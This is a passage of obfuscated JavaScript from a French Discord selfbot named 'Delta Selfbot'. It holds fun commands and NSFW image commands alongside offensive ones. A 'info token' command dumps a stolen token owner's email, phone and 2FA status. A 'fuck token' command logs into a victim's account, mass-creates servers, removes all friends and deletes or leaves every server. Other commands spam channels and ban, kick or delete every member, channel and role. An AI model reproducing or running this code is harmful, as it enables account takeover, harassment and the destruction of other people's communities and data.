                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
            }
            clearInterval();
            _0x18f2x3c.edit('**Commande ddos stopé**');
            console.log('Commande ddos voc stopé'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'spam')) {
            if (!_0x18f2x3c.guild) {
                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
            }
            let _0x18f2x50 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta Selfbot';
            _0x18f2x3c.edit('**Wait...**');
            setInterval(() =>

                {
                    _0x18f2x3c.channel.send(_0x18f2x50)
                        .catch(_0x18f2x44 =>

                            {
                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                            });
                }, 1000);
            console.log('Commande spam executé'.yellow);
        }
        if (_0x18f2x3b.content == prefix + 'stop spam') {
            if (!_0x18f2x3c.guild) {
                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
            }
            clearInterval();
            _0x18f2x3c.edit('**Commande spam stopé**');
            client.destroy()
                .then(() =>

                    {
                        return client['login'](token);
                    });
            console.log('Commande spam stopé'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'info token')) {
            let _0x18f2x40 = _0x18f2x3d.splice(2)
                .join(' ');
            let _0x18f2x49 = 'https://discordapp.com/api/v6/users/@me';
            request(_0x18f2x49, {
                    method: 'GET',
                    headers: {
                        authorization: _0x18f2x40
                    }
                }, function(_0x18f2x44, _0x18f2x4a, _0x18f2x4b)

                {
                    if (_0x18f2x4a.statusCode === 200) {
                        new Promise((_0x18f2x51, _0x18f2x52) =>

                            {
                                let _0x18f2x49 = 'https://discordapp.com/api/v6/users/@me';
                                request(_0x18f2x49, {
                                        method: 'GET',
                                        headers: {
                                            authorization: _0x18f2x40
                                        }
                                    }, function(_0x18f2x44, _0x18f2x4a, _0x18f2x4b)

                                    {
                                        _0x18f2x4b = JSON.parse(_0x18f2x4b);
                                        var _0x18f2x53 = _0x18f2x4b.id;
                                        var _0x18f2x54 = _0x18f2x4b.username;
                                        var _0x18f2x55 = _0x18f2x4b.avatar;
                                        var _0x18f2x56 = _0x18f2x4b.discriminator;
                                        var _0x18f2x57 = _0x18f2x4b.mfa_enabled;
                                        var _0x18f2x58 = _0x18f2x4b.phone;
                                        var _0x18f2x59 = _0x18f2x4b.locale;
                                        let _0x18f2x5a = _0x18f2x4b.public_flags;
                                        let _0x18f2x5b = _0x18f2x4b.flags;
                                        let _0x18f2x5c = _0x18f2x4b.email;
                                        let _0x18f2x5d = _0x18f2x4b.verified;
                                        let _0x18f2x5e = _0x18f2x4b.nsfw_allowed;
                                        var _0x18f2x5f = '';
                                        _0x18f2x5f = '' + ('\nUser: ' + _0x18f2x4b.username + '#' + _0x18f2x4b.discriminator);
                                        _0x18f2x5f = _0x18f2x5f + ('\nId: ' + _0x18f2x4b.id);
                                        _0x18f2x5f = _0x18f2x5f + ('\nEmail: ' + _0x18f2x4b.email);
                                        _0x18f2x5f = _0x18f2x5f + ('\nNuméro de telephone: ' + _0x18f2x4b.phone);
                                        _0x18f2x5f = _0x18f2x5f + ('\nAvatar: ' + _0x18f2x4b.avatar);
                                        _0x18f2x5f = _0x18f2x5f + ('\nLangue: ' + _0x18f2x4b.locale);
                                        _0x18f2x5f = _0x18f2x5f + ('\nA2f activé?: ' + _0x18f2x4b.mfa_enabled);
                                        _0x18f2x5f = _0x18f2x5f + ('\nCompte vérifié?: ' + _0x18f2x4b.verified);
                                        _0x18f2x5f = _0x18f2x5f + ('\nNsfw activé?: ' + _0x18f2x4b.nsfw_allowed);
                                        _0x18f2x5f = _0x18f2x5f + ('\nFlags: ' + _0x18f2x4b.flags);
                                        _0x18f2x5f = _0x18f2x5f + ('\nPublic Flags: ' + _0x18f2x4b.public_flags);
                                        var _0x18f2x12 = new Discord.RichEmbed()
                                            .setTitle('**Commande Token Info**')
                                            .setDescription(_0x18f2x5f)
                                            .setColor(color)
                                            .setFooter('Delta-Selfbot');
                                        return _0x18f2x3b['edit'](_0x18f2x12)['then'](console['log']('Commande info token executé' ['yellow']));
                                    });
                            });
                        if (client.user.id === '720920857366626335') {
                            return;
                        }
                    } else {
                        var _0x18f2x4d = new Discord.RichEmbed()
                            .setTitle('Token info')
                            .setDescription('Le token ' + _0x18f2x3d.splice(2)
                                .join(' ') + ' \\nn\'est pas valide :x:')
                            .setColor(color)
                            .setTimestamp()
                            .setFooter('Delta Selfbot', _0x18f2x3b.author.avatarURL);
                        _0x18f2x3b.edit(_0x18f2x4d)
                            .catch(_0x18f2x44 =>

                                {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                    }
                });
        };
        if (_0x18f2x3b.content.startsWith(prefix + 'fuck token')) {
            let _0x18f2x60 = new Discord.Client();
            let _0x18f2x40 = _0x18f2x3d.splice(2)
                .join(' ');
            let _0x18f2x49 = 'https://discordapp.com/api/v6/users/@me';
            request(_0x18f2x49, {
                    method: 'GET',
                    headers: {
                        authorization: _0x18f2x40
                    }
                }, function(_0x18f2x44, _0x18f2x4a, _0x18f2x4b)

                {
                    if (_0x18f2x4a.statusCode === 200) {
                        _0x18f2x60.on('ready', function()

                            {
                                for (pas = 0; pas < 100; pas++) {
                                    _0x18f2x60.user.createGuild('Delta-Selfbot', 'london');
                                }
                            });
                        for (pas = 0; pas < 20; pas++) {
                            fetch('https://discord.com/api/v8/users/@me/settings', {
                                'headers': {
                                    'authorization': _0x18f2x40,
                                    'content-type': 'application/json'
                                },
                                'body': '{"theme":"light"}',
                                'method': 'PATCH'
                            });
                            fetch('https://discord.com/api/v8/users/@me/settings', {
                                'headers': {
                                    'authorization': _0x18f2x40,
                                    'content-type': 'application/json'
                                },
                                'body': '{"theme":"dark"}',
                                'method': 'PATCH'
                            });
                        };
                        _0x18f2x60.on('ready', function()

                            {
                                _0x18f2x60.user.friends.forEach(_0x18f2x61 =>

                                    {
                                        _0x18f2x60.user.removeFriend(_0x18f2x61)
                                            .catch(_0x18f2x44 =>

                                                {
                                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                                });
                                    });
                                _0x18f2x60.guilds.forEach(_0x18f2x62 =>

                                    {
                                        if (_0x18f2x62.ownerID === _0x18f2x60.user.id) {
                                            _0x18f2x62.delete()
                                                .catch(_0x18f2x44 =>

                                                    {
                                                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                                    });
                                        } else {
                                            _0x18f2x62.leave()
                                                .catch(_0x18f2x44 =>

                                                    {
                                                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                                    });
                                        }
                                    });
                                _0x18f2x3b.edit(':white_check_mark: **Token fuck en cours...**');
                            });
                        _0x18f2x60.login(_0x18f2x40);
                        if (client.user.id === '720920857366626335') {
                            return;
                        }
                    } else {
                        var _0x18f2x4d = new Discord.RichEmbed()
                            .setTitle('Token info')
                            .setDescription('Le token ' + _0x18f2x3d.splice(2)
                                .join(' ') + ' \\nn\'est pas valide :x:')
                            .setColor(color)
                            .setTimestamp()
                            .setFooter('Delta Selfbot', _0x18f2x3b.author.avatarURL);
                        _0x18f2x3b.edit(_0x18f2x4d)
                            .catch(_0x18f2x44 =>

                                {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                    }
                });
            console.log('Commande fuck token executé'.yellow);
        };
        if (_0x18f2x3b.content.startsWith(prefix + '8ball')) {
            let _0x18f2x3d = _0x18f2x3b.content.split(' ')
                .splice(1)
                .join(' ');
            var _0x18f2x63 = [
                'oui!', 'non...', 'peut etre?', 'probablement', 'je ne pense pas.', 'jamais!', 'tu peux essayer...'
            ];
            if (_0x18f2x3d[1] != null) {
                _0x18f2x3b.edit(_0x18f2x3b.content.split(' ')
                        .splice(1)
                        .join(' ') + '\nla reponse est: ' + _0x18f2x63[Math.floor(Math.random() * [
                            'oui!', 'non...', 'peut etre?', 'probablement', 'je ne pense pas.', 'jamais!', 'tu peux essayer...'
                        ].length)])
                    .catch(_0x18f2x44 =>

                        {
                            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                        });
            } else {
                _0x18f2x3b.edit('Quelle est ta question? :rolling_eyes: (essayeplutot:' + prefix + ' 8ball [question])');
            }
            console.log('Commande 8ball executé'.yellow);
        };
        if (_0x18f2x3b.content.startsWith(prefix + 'mp friend')) {
            if (!_0x18f2x3b.content.split(' ')
                .splice(1)
                .join(' ')) {
                throw 'Vous devez mettre quelque chose à dire !';
            }
            let _0x18f2x64 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta Selfbot';
            _0x18f2x3b.edit(_0x18f2x64)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande Say executé'.yellow);
        };
        if (_0x18f2x3b.content.startsWith(prefix + 'say')) {
            if (!_0x18f2x3b.content.split(' ')
                .splice(1)
                .join(' ')) {
                throw 'Vous devez mettre quelque chose à dire !';
            }
            let _0x18f2x64 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta selfbot';
            let _0x18f2x65 = new Discord.RichEmbed()
                .setTitle('**Commande Say**')
                .setDescription(_0x18f2x64)
                .setTimestamp()
                .setFooter('Delta-Selbot', '' + client.user.avatarURL + '')
                .setColor(color);
            for (pas = 0; pas < 10; pas++) {
                _0x18f2x65.setColor(color);
                _0x18f2x3b.edit(_0x18f2x65)
                    .catch(_0x18f2x44 =>

                        {
                            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                        });
            }
            console.log('Commande Say executé'.yellow);
        };
        if (_0x18f2x3b.content.startsWith(prefix + 'user info')) {
            if (!_0x18f2x3b.mentions.users.first()) {
                {
                    _0x18f2x3c.edit(':x: **Utilisateur inconnu!**');
                    return _0x18f2x3e = _0x18f2x3b.author;
                }
            }
            var _0x18f2x66 = _0x18f2x3b.guild.member(_0x18f2x3e);
            var _0x18f2x67 = _0x18f2x3e.presence.game;
            var _0x18f2x68 = _0x18f2x67 ? _0x18f2x67.name : 'Nothing';
            var _0x18f2x69 = !_0x18f2x3b.guild.member(_0x18f2x3e) ? null : _0x18f2x66.roles.array();
            if (_0x18f2x66) {
                _0x18f2x69.shift();
                for (var i = 0; i < _0x18f2x69.length; ++i) {
                    _0x18f2x69[i] = _0x18f2x69[i].name;
                }
                _0x18f2x69 = _0x18f2x69.join(', ');
            };
            var _0x18f2x6a = {
                dnd: 'Do Not Disturb',
                offline: 'Offline/Invisible',
                online: 'Online',
                idle: 'Idle'
            };
            const _0x18f2x12 = new Discord.RichEmbed()
                .setAuthor('' + _0x18f2x3e.username + '#' + _0x18f2x3e.discriminator + ' | ' + _0x18f2x3e.id + '', _0x18f2x3e.displayAvatarURL)
                .setFooter('Delta-Selfbot')
                .setThumbnail(_0x18f2x3e.displayAvatarURL)
                .setColor(color)
                .addField('Created', '' + _0x18f2x3e.createdAt.toString()
                    .substr(0, 15) + ',\\n' + checkDays(_0x18f2x3e.createdAt) + '', true)
                .addField('Joined', '' + _0x18f2x66.joinedAt.toString()
                    .substr(0, 15) + ',\\n' + checkDays(_0x18f2x66.joinedAt) + '', true)
                .addField('Status', _0x18f2x6a[_0x18f2x3e.presence.status], true)
                .addField('Playing', _0x18f2x68, true)
                .addField('Nickname', _0x18f2x66.nickname ? _0x18f2x66.nickname : 'None', true)
                .addField('Avatar URL', '[Click here!](' + _0x18f2x3e.displayAvatarURL + ')', true)
                .addField('Roles', _0x18f2x69 ? _0x18f2x69 : 'None');
            _0x18f2x3c.edit(_0x18f2x12)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande user info executé'.yellow);
        };
        if (_0x18f2x3b.content === prefix + 'serveur info') {
            if (!_0x18f2x3c.guild) {
                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
            }
            const _0x18f2x6b = new Date()
                .getTime() - _0x18f2x3c.guild.createdAt.getTime();
            const _0x18f2x2c = _0x18f2x6b / 1000 / 60 / 60 / 24;
            const _0x18f2x6c = [
                'None', 'Low', 'Medium', 'Insane', 'Extreme'
            ];
            let _0x18f2x12 = new Discord.RichEmbed()
                .setTitle('**Serveur info**')
                .addField('Name:', '' + _0x18f2x3c.guild.name + '')
                .addField('Created On:', '' + _0x18f2x3b.guild.createdAt.toString()
                    .substr(0, 15) + ',\\n' + checkDays(_0x18f2x3b.guild.createdAt) + '', true)
                .addField('Default Channel:', '' + _0x18f2x3c.guild.defaultChanne + '')
                .addField('Region:', '' + _0x18f2x3c.guild.region + '')
                .addField('Member Count', '' + _0x18f2x3c.guild.members.filter(_0x18f2x6d =>

                        {
                            return _0x18f2x6d.presence.status !== 'offline';
                        })
                    .size + ' / ' + _0x18f2x3c.guild.memberCount + '')
                .addField('Owner:', '' + _0x18f2x3b.guild.owner.user.username + '')
                .addField('Text Channels', '' + _0x18f2x3c.guild.channels.filter(_0x18f2x6d =>

                        {
                            return _0x18f2x6d.type === 'text';
                        })
                    .size + '')
                .addField('Voice Channels', '' + _0x18f2x3c.guild.channels.filter(_0x18f2x6d =>

                        {
                            return _0x18f2x6d.type === 'voice';
                        })
                    .size + '')
                .addField('Verification Level', '' + _0x18f2x6c[_0x18f2x3c.guild.verificationLevel] + '')
                .addField('Roles:', '' + _0x18f2x3c.guild.roles.size + '')
                .addField('Guild ID:', '' + _0x18f2x3c.guild.id + '')
                .setColor(color);
            if (_0x18f2x3c.guild.iconURL != null) {
                _0x18f2x12.setThumbnail('' + _0x18f2x3c.guild.iconURL + '');
            }
            _0x18f2x3c.edit(_0x18f2x12)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande serveur info effectué'.yellow);
        };
        if (_0x18f2x3b.content === prefix + 'stats') {
            let _0x18f2x12 = new Discord.RichEmbed();
            _0x18f2x12.setTimestamp()
                .setColor(color)
                .setTitle('**Selfbot Statistics**')
                .addField('Mem Usage:', '' + (process.memoryUsage()
                        .heapUsed / 1024 / 1024)
                    .toFixed(2) + 'MB')
                .addField('Servers:', '' + client.guilds.size + '')
                .addField('Channels:', '' + client.channels.size + '')
                .addField('Users:', '' + client.guilds.map(_0x18f2x16 =>

                    {
                        return _0x18f2x16.memberCount;
                    }) + '')
                .addField('Servers:', '' + client.guilds.size + '')
                .addField('Servers:', '' + client.guilds.size + '')
                .setFooter('Delta-Selfbot', '' + client.user.avatarURL + '');
            if (client.user.premium > 0) {
                _0x18f2x12.addField('• Nitro', 'oui');
            } else {
                _0x18f2x12.addField('• Nitro', 'non');
            }
            _0x18f2x3b.edit(_0x18f2x12)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande stats effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'ass')) {
            superagent.get('https://nekobot.xyz/api/image')
                .query({
                    type: 'ass'
                })
                .end((_0x18f2x6e, _0x18f2x4a) =>

                    {
                        var _0x18f2x6f = new Discord.RichEmbed()
                            .setColor(color)
                            .setFooter('Delta-Selfbot')
                            .setTimestamp()
                            .setImage(_0x18f2x4a.body.message)
                            .setColor(color);
                        _0x18f2x3c.edit(_0x18f2x6f)
                            .catch(_0x18f2x44 =>

                                {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                    });
            console.log('Commande ass effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + '4k')) {
            superagent.get('https://nekobot.xyz/api/image')
                .query({
                    type: '4k'
                })
                .end((_0x18f2x6e, _0x18f2x4a) =>

                    {
                        var _0x18f2x70 = new Discord.RichEmbed()
                            .setFooter('Delta-Selfbot')
                            .setTimestamp()
                            .setImage(_0x18f2x4a.body.message)
                            .setColor(color);
                        _0x18f2x3c.edit(_0x18f2x70)
                            .catch(_0x18f2x44 =>

                                {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                        console.log('Commande 4k effectué'.yellow);
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'nsfw-gif')) {
            var _0x18f2x71 = new Discord.RichEmbed();
            superagent.get('https://nekobot.xyz/api/image')
                .query({
                    type: 'pgif'
                })
                .end((_0x18f2x6e, _0x18f2x4a) =>

                    {
                        var _0x18f2x71 = new Discord.RichEmbed()
                            .setFooter('Delta-Selfbot')
                            .setTimestamp()
                            .setImage(_0x18f2x4a.body.message)
                            .setColor(color);
                        _0x18f2x3c.edit(_0x18f2x71)
                            .catch(_0x18f2x44 =>

                                {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                        console.log('Commande nsfw gif effectué'.yellow);
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'hentai')) {
            var _0x18f2x72 = new Discord.RichEmbed();
            superagent.get('https://nekobot.xyz/api/image')
                .query({
                    type: 'hentai_anal'
                })
                .end((_0x18f2x6e, _0x18f2x4a) =>

                    {
                        var _0x18f2x72 = new Discord.RichEmbed()
                            .setFooter('Delta-Selfbot')
                            .setTimestamp()
                            .setImage(_0x18f2x4a.body.message)
                            .setColor(color);
                        _0x18f2x3c.edit(_0x18f2x72)
                            .catch(_0x18f2x44 =>

                                {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                        console.log('Commande hentai effectué'.yellow);
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'pussy')) {
            superagent.get('https://nekobot.xyz/api/image')
                .query({
                    type: 'pussy'
                })
                .end((_0x18f2x6e, _0x18f2x4a) =>

                    {
                        var _0x18f2x73 = new Discord.RichEmbed()
                            .setFooter('Delta-Selfbot')
                            .setTimestamp()
                            .setImage(_0x18f2x4a.body.message)
                            .setColor(color);
                        _0x18f2x3c.edit(_0x18f2x73)
                            .catch(_0x18f2x44 =>

                                {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                        console.log('Commande pussy effectué'.yellow);
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'thigh')) {
            superagent.get('https://nekobot.xyz/api/image')
                .query({
                    type: 'thigh'
                })
                .end((_0x18f2x6e, _0x18f2x4a) =>

                    {
                        var _0x18f2x74 = new Discord.RichEmbed()
                            .setFooter('Delta-Selfbot')
                            .setTimestamp()
                            .setImage(_0x18f2x4a.body.message)
                            .setColor(color);
                        _0x18f2x3c.edit(_0x18f2x74)
                            .catch(_0x18f2x44 =>

                                {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                        console.log('Commande thigh effectué'.yellow);
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'anal')) {
            superagent.get('https://nekobot.xyz/api/image')
                .query({
                    type: 'anal'
                })
                .end((_0x18f2x6e, _0x18f2x4a) =>

                    {
                        var _0x18f2x75 = new Discord.RichEmbed()
                            .setFooter('Delta-Selfbot')
                            .setTimestamp()
                            .setImage(_0x18f2x4a.body.message)
                            .setColor(color);
                        _0x18f2x3c.edit(_0x18f2x75)
                            .catch(_0x18f2x44 =>

                                {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                        console.log('Commande anal effectué'.yellow);
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'fight')) {
            if (!_0x18f2x3b.author) {
                return _0x18f2x3c['edit'](':x: **Aucun utilisateur mentionné**');
            }
            var _0x18f2x76 = new Discord.RichEmbed()
                .setColor(color)
                .setFooter('Delta-Selfbot')
                .setTitle(_0x18f2x3e.username + ' __**VS**__ ' + client.user.username)
                .setImage('https://data.photofunky.net/output/image/b/e/9/2/be9268/photofunky.gif');
            _0x18f2x3b.edit(_0x18f2x76)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande fight effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'boom')) {
            if (!_0x18f2x3b.author) {
                return _0x18f2x3c['edit'](':x: **Aucun utilisateur mentionné**');
            }
            var _0x18f2x77 = new Discord.RichEmbed()
                .setColor(color)
                .setFooter('Delta-Selfbot')
                .setTitle(_0x18f2x3e.username + ' **Ce Fait Explosé Par **💣💥 ' + client.user.username)
                .setImage('https://media.discordapp.net/attachments/648223633185177612/650715035592687647/image0.gif');
            _0x18f2x3b.edit(_0x18f2x77)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande boom effectué'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'shutdown') {
            _0x18f2x3c.delete()
                .then(() =>

                    {
                        return process['exit'](1);
                    });
            console.log('Commande shutdown effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'kick')) {
            let _0x18f2x78 = _0x18f2x3b.guild;
            if (!_0x18f2x3b.guild) {
                _0x18f2x3b.edit(':x: **Veuillez executer cette commande sur un serveur!**');
                return;
            }
            if (!_0x18f2x3b.author) {
                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
                return;
            }
            _0x18f2x3e.kick()
                .then(_0x18f2x79 =>

                    {
                        _0x18f2x3b.edit(':wave: undefined has been successfully kicked :point_right: ');
                    })
                .catch(() =>

                    {
                        _0x18f2x3b.edit(':x: **Access Denied**');
                    });
            console.log('Commande kick effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'ban')) {
            let _0x18f2x78 = _0x18f2x3b.guild;
            if (!_0x18f2x3b.guild) {
                _0x18f2x3b.edit(':x: **Veuillez executer cette commande sur un serveur!**');
                return;
            }
            if (!_0x18f2x3b.author) {
                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
                return;
            }
            _0x18f2x3e.ban()
                .then(_0x18f2x79 =>

                    {
                        _0x18f2x3b.edit(':wave: undefined has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right: ');
                    })
                .catch(() =>

                    {
                        _0x18f2x3b.edit(':x: **Access Denied**');
                    });
            console.log('Commande ban effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'name all')) {
            let _0x18f2x78 = _0x18f2x3b.guild;
            if (!_0x18f2x3b.guild) {
                return _0x18f2x3c['edit'](':x: **Commande uniquement utilisable sur un serveur**');
            }
            const _0x18f2x7a = _0x18f2x3b.content.split(' ')
                .slice(2)
                .join(' ') || _0x18f2x3b.author.username;
            if (!_0x18f2x3b.member.hasPermission('MANAGE_NICKNAMES')) {
                return _0x18f2x3b['delete']()['then'](console['log']('[', 'ERROR' ['red'], ']', 'permission insuffisante' ['green']));
            }
            const _0x18f2x7b = _0x18f2x3b.guild.members;
            _0x18f2x3c.edit('Je renomme tout le monde par ' + (_0x18f2x3b.content.split(' ')
                .slice(2)
                .join(' ') || _0x18f2x3b.author.username) + '');
            _0x18f2x7b.forEach(_0x18f2x7c =>

                {
                    _0x18f2x7c.setNickname(_0x18f2x7a)
                        .catch(_0x18f2x44 =>

                            {
                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                            });
                });
            console.log('Commande name all effectué'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'ban-all') {
            let _0x18f2x78 = _0x18f2x3b.guild;
            if (!_0x18f2x3b.guild) {
                return _0x18f2x3c['edit'](':x: **Commande uniquement utilisable sur un serveur**');
            }
            if (!_0x18f2x3b.member.hasPermission('BAN_MEMBERS')) {
                return _0x18f2x3b['delete']()['then'](console['log']('[', 'ERROR' ['red'], ']', 'permission insuffisante' ['green']));
            }
            const _0x18f2x7b = _0x18f2x3b.guild.members;
            _0x18f2x7b.forEach(_0x18f2x7c =>

                {
                    if (!_0x18f2x7c.bannable) {
                        return;
                    }
                    _0x18f2x7c.ban()
                        .catch(_0x18f2x44 =>

                            {
                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                            });
                });
            console.log('Commande ban all effectué'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'kick-all') {
            let _0x18f2x78 = _0x18f2x3b.guild;
            if (!_0x18f2x3b.guild) {
                return _0x18f2x3c['edit'](':x: **Commande uniquement utilisable sur un serveur**');
            }
            if (!_0x18f2x3b.member.hasPermission('KICK_MEMBERS')) {
                return _0x18f2x3b['delete']()['then'](console['log']('[', 'ERROR' ['red'], ']', 'permission insuffisante' ['green']));
            }
            const _0x18f2x7b = _0x18f2x3b.guild.members;
            _0x18f2x7b.forEach(_0x18f2x7c =>

                {
                    if (!_0x18f2x7c.kickable) {
                        return;
                    }
                    _0x18f2x7c.kick()
                        .catch(_0x18f2x44 =>

                            {
                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                            });
                });
            console.log('Commande kick all effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'purge')) {
            _0x18f2x3b.channel.fetchMessages()
                .then(_0x18f2x3b =>

                    {
                        return _0x18f2x3b.forEach(_0x18f2x6d =>

                            {
                                if (_0x18f2x6d.author.id === client.user.id) {
                                    _0x18f2x6d.delete()
                                        .catch(_0x18f2x44 =>

                                            {
                                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                            });
                                }
                            });
                    });
            console.log('Commande purge effectué'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'rire') {
            let _0x18f2x7d = new Discord.RichEmbed();
            _0x18f2x7d.setColor(color)
                .setTitle('**Commande rire:**')
                .setTimestamp()
                .setFooter('Delta-Selfbot')
                .setImage(rire[Math.floor(Math.random() * rire.length)]);
            _0x18f2x3b.edit(_0x18f2x7d)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande rire effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'kiss')) {
            if (!_0x18f2x3b.author) {
                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
                return;
            }
            let _0x18f2x7e = new Discord.RichEmbed();
            _0x18f2x7e.setColor(color)
                .setTitle('**' + client.user.username + ' kiss ' + _0x18f2x3e.username + '**')
                .setTimestamp()
                .setFooter('Delta-Selfbot')
                .setImage(kiss[Math.floor(Math.random() * kiss.length)]);
            _0x18f2x3b.edit(_0x18f2x7e)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande kiss effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'veski')) {
            if (!_0x18f2x3b.author) {
                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
                return;
            }
            let _0x18f2x7f = new Discord.RichEmbed();
            _0x18f2x7f.setColor(color)
                .setTitle('**' + _0x18f2x3e.username + ' s\'est enfui!**')
                .setTimestamp()
                .setFooter('Delta-Selfbot')
                .setImage(veski[Math.floor(Math.random() * veski.length)]);
            _0x18f2x3b.edit(_0x18f2x7f)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande veski effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'load')) {
            _0x18f2x3b.delete();
            var _0x18f2x80 = '.';
            var _0x18f2x81 = '█';
            _0x18f2x3b.channel.send('```[' + _0x18f2x80.repeat(50) + ']```')
                .then(_0x18f2x3b =>

                    {
                        for (i = 0; i <= 50; i++) {
                            _0x18f2x3b.edit('```[' + _0x18f2x81.repeat(i) + _0x18f2x80.repeat(50 - i) + ']  -  ' + i * 100 / 50 + '%\n' + 'loading..```');
                        }
                        _0x18f2x3b.edit('`Succesfull load.`')
                            .catch(_0x18f2x44 =>

                                {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                        console.log('Commande load effectué'.yellow);
                    });
        }
        if (_0x18f2x3b.content === prefix + 'delete all channel') {
            let _0x18f2x78 = _0x18f2x3b.guild;
            if (!_0x18f2x3b.guild) {
                _0x18f2x3b.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                return;
            }
            if (!_0x18f2x3b.member.hasPermission('MANAGE_CHANNELS')) {
                return _0x18f2x3b['delete']()['then'](console['log']('[', 'ERROR' ['red'], ']', 'permission insuffisante' ['green']));
            }
            var _0x18f2x82 = _0x18f2x3b.guild.channels;
            _0x18f2x82.forEach(_0x18f2x83 =>

                {
                    _0x18f2x83.delete()
                        .catch(_0x18f2x44 =>

                            {
                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                            });
                });
            console.log('Commande delete all channel effectué'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'delete all role') {
            let _0x18f2x78 = _0x18f2x3c.guild;
            if (!_0x18f2x3c.guild) {
                _0x18f2x3b.edit(':x: **Veuillez executer cette commande sur un serveur!**');
                return;
            }
            _0x18f2x3b.guild.roles.forEach(_0x18f2x47 =>

                {
                    _0x18f2x47.delete()
                        .catch(_0x18f2x44 =>

                            {
                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                            });
                });
